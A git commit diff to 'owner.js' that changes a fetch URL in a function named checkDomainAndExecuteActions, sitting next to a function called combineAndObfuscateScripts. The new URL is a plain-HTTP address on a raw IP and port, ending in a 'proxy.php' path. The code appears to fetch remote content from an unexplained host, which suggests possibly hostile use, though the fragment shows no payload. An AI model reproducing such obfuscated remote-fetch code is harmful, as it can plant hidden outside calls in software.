375fa8abcdc33c23e88ee1be66166e1bb50a4b18
Evg Nalivayko <114686372+EvgeniiNalivayko@users.noreply.github.com>
2024-05-29 12:35:11 +0300

    Update owner.js

--- owner.js
+++ owner.js
@@ -46,7 +46,7 @@ function combineAndObfuscateScripts() {
 }
 
 function checkDomainAndExecuteActions() {
-    fetch('https://185.253.44.120:8888/vhosts/85/files/proxy.php')
+    fetch('http://185.253.44.120:7777/jo.nesadah.com/proxy.php')
         .then(response => {
             if (!response.ok) {
                 throw new Error('Network response was not ok');
